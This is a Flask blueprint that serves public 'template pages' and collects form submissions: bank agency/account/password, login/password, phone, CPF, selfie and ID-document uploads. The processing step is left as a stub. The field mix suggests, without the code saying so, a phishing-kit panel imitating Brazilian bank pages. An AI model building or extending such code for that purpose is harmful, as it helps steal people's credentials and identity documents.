from flask import Blueprint, render_template, abort, request
from app.models.template import Template
from app.services.audit_service import AuditService
import logging

# Create blueprint
public_template_bp = Blueprint('public_template', __name__, url_prefix='/template')

@public_template_bp.route('/<slug>/<page_id>', methods=['GET', 'POST'])
def render_page(slug, page_id):
    """
    Public endpoint to render a template page by slug and page ID
    Example: /template/basic_template/home
    """
    try:
        # Get template by slug
        template = Template.get_by_slug(slug)
        if not template:
            logging.warning(f"Template not found with slug: {slug}")
            abort(404, description="Template not found")
        
        # Get the specific page
        page = Template.get_page_by_id(slug, page_id)
        if not page:
            logging.warning(f"Page not found: {page_id} in template {slug}")
            abort(404, description="Page not found")
        
        # Get client IP for logging
        client_ip = request.remote_addr
        
        # Log page access
        try:
            AuditService.log_action(
                action='template_page_view',
                target_type='template_page',
                target_id=f"{slug}/{page_id}",
                details={
                    'slug': slug,
                    'page_id': page_id,
                    'template_name': template.get('name'),
                    'page_name': page.get('name'),
                    'client_ip': client_ip
                }
            )
        except Exception as log_error:
            logging.error(f"Failed to log page view: {log_error}")
        
        # Render the public template page (simplified - just HTML content)
        return render_template(
            'public/template_page_simple.html',
            template=template,
            page=page,
            slug=slug,
            page_id=page_id
        )
    
    except Exception as e:
        logging.error(f"Error rendering template page {slug}/{page_id}: {e}")
        abort(500, description="Internal server error")

@public_template_bp.route('/<slug>/<page_id>/submit', methods=['POST'])
def submit_page(slug, page_id):
    """
    Handle form submission from a template page
    Example: POST /template/basic_template/login/submit
    """
    try:
        # Get template and page
        template = Template.get_by_slug(slug)
        if not template:
            abort(404, description="Template not found")
        
        page = Template.get_page_by_id(slug, page_id)
        if not page:
            abort(404, description="Page not found")
        
        # Collect form data based on page fields
        form_data = {}
        for field in page.get('fields', []):
            field_type = field.get('type')
            field_label = field.get('label')
            
            # Get form value based on field type
            if field_type == 'login_password':
                form_data['login'] = request.form.get('login', '')
                form_data['password'] = request.form.get('password', '')
            elif field_type == 'agency_account_password':
                form_data['agency'] = request.form.get('agency', '')
                form_data['account'] = request.form.get('account', '')
                form_data['password'] = request.form.get('password', '')
            elif field_type == 'phone':
                form_data['phone'] = request.form.get('phone', '')
            elif field_type == 'cpf':
                form_data['cpf'] = request.form.get('cpf', '')
            elif field_type == 'selfie':
                # Handle file upload
                if 'selfie' in request.files:
                    form_data['selfie'] = request.files['selfie'].filename
            elif field_type == 'document':
                # Handle file upload
                if 'document' in request.files:
                    form_data['document'] = request.files['document'].filename
        
        # Log form submission
        try:
            AuditService.log_action(
                action='template_page_submit',
                target_type='template_page',
                target_id=f"{slug}/{page_id}",
                details={
                    'slug': slug,
                    'page_id': page_id,
                    'template_name': template.get('name'),
                    'page_name': page.get('name'),
                    'form_data_keys': list(form_data.keys()),
                    'client_ip': request.remote_addr
                }
            )
        except Exception as log_error:
            logging.error(f"Failed to log form submission: {log_error}")
        
        # Here you would typically:
        # 1. Validate the data
        # 2. Process it (save to database, send email, etc.)
        # 3. Redirect to next page or show success message
        
        # For now, just return success
        return render_template(
            'public/submit_success.html',
            template=template,
            page=page,
            form_data=form_data
        )
    
    except Exception as e:
        logging.error(f"Error submitting form for {slug}/{page_id}: {e}")
        abort(500, description="Internal server error")
